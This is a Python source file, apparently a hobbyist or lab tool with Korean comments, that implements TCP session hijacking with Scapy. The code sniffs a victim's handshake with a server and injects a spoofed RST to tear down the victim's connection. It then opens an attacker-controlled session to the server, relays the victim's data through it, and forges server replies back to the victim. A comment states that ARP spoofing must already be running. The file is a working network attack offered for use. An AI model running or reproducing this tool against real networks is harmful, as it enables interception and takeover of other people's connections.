from scapy.all import *
import random

class TCP_Hijack_Tool():
    def __init__(self, victim_IP:str, victim_MAC:str, server_IP:str, server_PORT:int, server_MAC:str, hacker_MAC:str, hacker_IP:str, network_interface:str):
        self.network_interface = network_interface

        # TCP_info에 정보 저장
        self.TCP_info = {}
        '''
        {
            'victim': {
                'SEQ': 0,
                'ACK': 0,
                'IP': x.x.x.x,
                'SPORT': x,
                'MAC': xx:xx:xx:xx:xx:xx,
                'Remember_victim_seq': 0,
                'Remember_victim_ack': 0
            },
            'server': {
                'SEQ': 0,
                'ACK': 0,
                'IP': x.x.x.x,
                'DPORT': x,
                'MAC': xx:xx:xx:xx:xx:xx,
                'Remember_server_seq': 0,
                'Remember_server_ack': 0
            },
            'hacker': {
                'MAC': xx:xx:xx:xx:xx:xx,
                'IP': x.x.x.x
            }
        }
        '''
        self.TCP_info['victim'] = {}
        self.TCP_info['server'] = {}
        self.TCP_info['hacker'] = {}

        # (1) --> 피해자 간 TCP 정보 <--
        # (1)(1) --> Sequence Number 정보
        self.TCP_info['victim']['SEQ'] = 0
        # (1)(2) --> Acknowledgement Number 정보
        self.TCP_info['victim']['ACK'] = 0
        # (1)(3) --> IP 정보
        self.TCP_info['victim']['IP'] = victim_IP
        # (1)(4) --> MAC 정보
        self.TCP_info['victim']['MAC'] = victim_MAC
        # (1)(5) --> SPort 정보
        self.TCP_info['victim']['SPORT'] = 0 # 실제 스니핑하면서 찾아내기

        # (2) --> 서버 간 TCP 정보 <--
        # (2)(1) --> Sequence Number 정보
        self.TCP_info['server']['SEQ'] = 0
        # (2)(2) --> Acknowledgement Number 정보
        self.TCP_info['server']['ACK'] = 0
        # (2)(3) --> IP 정보
        self.TCP_info['server']['IP'] = server_IP
        # (2)(4) --> MAC 정보
        self.TCP_info['server']['MAC'] = server_MAC
        # (2)(5) --> Port 정보
        self.TCP_info['server']['PORT'] = server_PORT

        # (3) 중간자 MAC 정보
        self.TCP_info['hacker']['MAC'] = hacker_MAC # 중간자 MAC주소 ( 변환 해야하므로 )
        self.TCP_info['hacker']['SPORT'] = random.randint(1024,65535) # 중간자 SPORT 정보
        self.TCP_info['hacker']['IP'] = hacker_IP

        # 한 패킷 핸들러를 가지고 처리하므로, 상태 변수들이 여럿 존재해야함
        self.init_spoof_syn_ack_packet = False # 스푸핑 된 상태에서, SYN, SYN+ACK 후 공격자가 RST보내고, 서버간 연결 맺는 것 까지 해야 TRUE로 변함

    def Start_Sniffer(self):
        sniff(filter=
              f"tcp and ( ( host {self.TCP_info['server']['IP']} and host {self.TCP_info['victim']['IP']} ) or ( host {self.TCP_info['server']['IP']} and host {self.TCP_info['hacker']['IP']} ) and (port {self.TCP_info['server']['PORT']}))", prn=self.Packet_Callback, iface=self.network_interface)

    # 스니핑 된 패킷 처리 함수
    def Packet_Callback(self, packet):

        if packet.haslayer(TCP):
            if self.init_spoof_syn_ack_packet == False:
                # 초기 작업 시작
                # 1. 피해자가 서버에게 SYN 요청하는 것부터 초기에 잡아야함
                if packet[TCP].flags == "S" and packet[IP].src == self.TCP_info['victim']['IP'] and packet[IP].dst == self.TCP_info['server']['IP'] and packet[TCP].dport == self.TCP_info['server']['PORT']:
                    # 피해자 신분으로 SYN 전달 srp1으로
                    packet[Ether].src = self.TCP_info['victim']['MAC'] # 피해자가 서버에 패킷 정상 전달 처리
                    packet[Ether].dst = self.TCP_info['server']['MAC'] # 진짜 서버의 MAC 주소
                    self.TCP_info['victim']['SPORT'] = packet[TCP].sport

                    Received_SYNACK = srp1(packet) # 서버에게 SYN 전달
                    if Received_SYNACK and Received_SYNACK.haslayer(TCP) and Received_SYNACK[TCP].flags == "SA":
                        RST_PACKET = Ether(src=self.TCP_info['victim']['MAC'], dst=self.TCP_info['server']['MAC']) / \
                                    IP(src=self.TCP_info['victim']['IP'], dst=self.TCP_info['server']['IP']) / \
                                    TCP(sport=self.TCP_info['victim']['SPORT'], dport=self.TCP_info['server']['PORT'],
                                        seq=Received_SYNACK[TCP].ack, ack=Received_SYNACK[TCP].seq + 1,
                                        flags="R")  # RST 플래그 설정
                        sendp(RST_PACKET) # 공격자가 피해자<-> 서버 간 의 세션 끊어버리기

                        ##### 지금부터 공격자 <-> 서버 세션 생성 #####
                        syn_packet = IP(dst=self.TCP_info['server']['IP']) / TCP(sport=self.TCP_info['hacker']['SPORT'], dport=self.TCP_info['server']['PORT'], flags="S", seq=0)
                        syn_ack_response = sr1(syn_packet)  # SYN-ACK 응답을 기다림
                        if syn_ack_response and syn_ack_response.haslayer(TCP) and syn_ack_response[TCP].flags == "SA":
                            ack_packet = IP(dst=self.TCP_info['server']['IP']) / TCP(
                                sport=self.TCP_info['hacker']['SPORT'],
                                dport=self.TCP_info['server']['PORT'],
                                flags="A",
                                seq=syn_ack_response[TCP].ack,
                                ack=syn_ack_response[TCP].seq + 1,
                            )
                            send(ack_packet) # 서버에게 ACK 보내기 ( 세션 맺기 )

                            # 최근의 서버간 통신 seq,ack 정보 업데이트
                            self.TCP_info['server']['Remember_server_seq'] = syn_ack_response[TCP].ack
                            self.TCP_info['server']['Remember_server_ack'] = syn_ack_response[TCP].seq + 1

                            print("START_Hacker_Session_Hijacked")
                            self.init_spoof_syn_ack_packet = True
                            return

            else:
                # 초기 작업 후
                # 피해자가 서버에게 PSH+ACK를 보내는 것을 감지할 때
                if packet[TCP].flags == "PA" and packet[IP].src == self.TCP_info['victim']['IP'] and packet[IP].dst == self.TCP_info['server']['IP'] :
                    # 먼저, 클라이언트 간 세션 유지를 위해 seq, ack 정보를 업데이트
                    self.TCP_info['victim']['Remember_victim_seq'] = packet[TCP].seq
                    self.TCP_info['victim']['Remember_victim_ack'] = packet[TCP].ack

                    victim_payload = b''
                    victim_payload_len = 0
                    if packet[TCP].payload:
                        victim_payload = bytes( packet[TCP].payload )
                        victim_payload_len = len(victim_payload)
                        print(f"데이터 길이 --> {victim_payload_len}")

                    print(f"피해자가 서버에게 PSH+ACK 보냄 {packet.summary()}, seq: {packet[TCP].seq}, ack: {packet[TCP].ack}")

                    # 미리 클라이언트 ACK 계산하기
                    backup_ack = self.TCP_info['victim']['Remember_victim_seq']
                    self.TCP_info['victim']['Remember_victim_seq'] = self.TCP_info['victim']['Remember_victim_ack']
                    self.TCP_info['victim']['Remember_victim_ack'] = backup_ack + victim_payload_len

                    #===================================================================
                    #===================================================================

                    # 피해자 신분으로 공격자가 서버에게 PSH+ACK 데이터 전송
                    spoof_data_send_to_server = (
                            IP(dst=self.TCP_info['server']['IP']) / \
                            TCP(sport=self.TCP_info['hacker']['SPORT'], dport=self.TCP_info['server']['PORT'], flags="PA", seq=self.TCP_info['server']['Remember_server_seq'], ack=self.TCP_info['server']['Remember_server_ack']) / \
                            Raw(load=victim_payload)
                    )
                    print(f"보낼 spoof_data_send_packet 보기 : {spoof_data_send_to_server.summary()} -> seq: {self.TCP_info['server']['Remember_server_seq']}, ack: {self.TCP_info['server']['Remember_server_ack']}")
                    server_response_packet = sr1(spoof_data_send_to_server,timeout=1)
                    if server_response_packet and server_response_packet.haslayer(TCP) and server_response_packet[TCP].flags == "A":

                        # 서버 seq, ack 업데이트 만약 ACK에 데이터가 있는 경우 ( 흔하지 않음 )  Payload 추가해야할 것임 ( 코드 추가 X )
                        backup_seq = server_response_packet[TCP].seq
                        self.TCP_info['server']['Remember_server_seq'] = server_response_packet[TCP].ack
                        self.TCP_info['server']['Remember_server_ack'] = backup_seq

                        response_for_target_client = Ether(src=self.TCP_info['hacker']['MAC'], dst=self.TCP_info['victim']['MAC']) / \
                                                     IP(src=self.TCP_info['server']['IP'], dst=self.TCP_info['victim']['IP']) / \
                                                     TCP(sport=self.TCP_info['server']['PORT'],
                                                         dport=self.TCP_info['victim']['SPORT'],
                                                         seq=self.TCP_info['victim']['Remember_victim_seq'],
                                                         ack=self.TCP_info['victim']['Remember_victim_ack'],
                                                         flags="A")  # A 플래그 설정
                        print(
                            f"공격자가 클라이언트에게 ACK 보낼 것임 {{ 서버(MAC은 공격자임) -(ACK)-> 타겟클라이언트 }} seq: {self.TCP_info['victim']['Remember_victim_seq']}, ack: {self.TCP_info['victim']['Remember_victim_ack']}")

                        sendp(response_for_target_client)
                        #return

                # 서버가 클라이언트에게 PSH+ACK 데이터 전송하는 경우 대비가 되어야한다.
                if packet[TCP].flags == "PA" and packet[IP].src == self.TCP_info['server']['IP'] and packet[IP].dst == self.TCP_info['hacker']['IP'] :

                    server_payload = b''
                    server_payload_len = 0
                    send_psh_to_victim_by_server = None
                    print("서버에서 데이터 전송")
                    if packet[TCP].payload:
                        server_payload = bytes(packet[TCP].payload)
                        server_payload_len = len(server_payload)
                        print(f"서버의 PSH+ACK데이터 길이 --> {server_payload_len}")

                        # 미리 서버에게 반환할 ACK 계산함
                        backup_seq = packet[TCP].seq
                        self.TCP_info['server']['Remember_server_seq'] = packet[TCP].ack
                        self.TCP_info['server']['Remember_server_ack'] = backup_seq + server_payload_len


                        # 클라이언트에게 PSH 전달
                        send_psh_to_victim_by_server = Ether(src=self.TCP_info['hacker']['MAC'], dst=self.TCP_info['victim']['MAC']) / \
                                                        IP(src=self.TCP_info['server']['IP'], dst=self.TCP_info['victim']['IP']) / \
                                                        TCP(sport=self.TCP_info['server']['PORT'],
                                                            dport=self.TCP_info['victim']['SPORT'],
                                                            flags="PA",
                                                            seq=self.TCP_info['victim']['Remember_victim_seq'],
                                                            ack=self.TCP_info['victim']['Remember_victim_ack']) / \
                                                        Raw(load=server_payload)
                    else:
                        send_psh_to_victim_by_server = Ether(src=self.TCP_info['hacker']['MAC'],
                                                             dst=self.TCP_info['victim']['MAC']) / \
                                                       IP(src=self.TCP_info['server']['IP'],
                                                          dst=self.TCP_info['victim']['IP']) / \
                                                       TCP(sport=self.TCP_info['server']['PORT'],
                                                           dport=self.TCP_info['victim']['SPORT'],
                                                           flags="PA",
                                                           seq=self.TCP_info['victim']['Remember_victim_seq'],
                                                           ack=self.TCP_info['victim']['Remember_victim_ack'])


                    received_victim = srp1(send_psh_to_victim_by_server,timeout=1) # 클라이언트 피해자에게 서버의 PSH를 전달
                    if received_victim and received_victim.haslayer(TCP) and received_victim[TCP].flags == "A":
                        print(f"피해자 클라이언트로부터 ACK를 받음 {received_victim.summary()} -> seq: {received_victim[TCP].seq}, ack: {received_victim[TCP].ack}")
                        backup = received_victim[TCP].seq
                        self.TCP_info['victim']['Remember_victim_seq'] = received_victim[TCP].ack
                        self.TCP_info['victim']['Remember_victim_ack'] = backup

                        # 이제 최종적으로 해커신원으로 서버에게 ACK 전달하여 마무리
                        response_for_server = IP(dst=self.TCP_info['server']['IP']) / \
                                                    TCP(sport=self.TCP_info['hacker']['SPORT'],
                                                        dport=self.TCP_info['server']['PORT'],
                                                        flags="A",
                                                        seq=self.TCP_info['server']['Remember_server_seq'],
                                                        ack=self.TCP_info['server']['Remember_server_ack'])
                        print(f"서버에게 ACK 전달하여 마무리 -> {response_for_server.summary()}")

                        send(response_for_server)
                    pass

# 스푸핑이 되어 있어야 합니다!!!
TCP_Hijack_Tool(

    victim_IP='192.168.1.200',
    victim_MAC='00:0c:29:54:de:5b',

    server_IP='192.168.0.100',
    server_PORT=4090,
    server_MAC='00:0c:29:8d:86:af',

    hacker_MAC='00:0c:29:94:bc:2e',
    hacker_IP='192.168.0.10',
    network_interface='eth0'
).Start_Sniffer()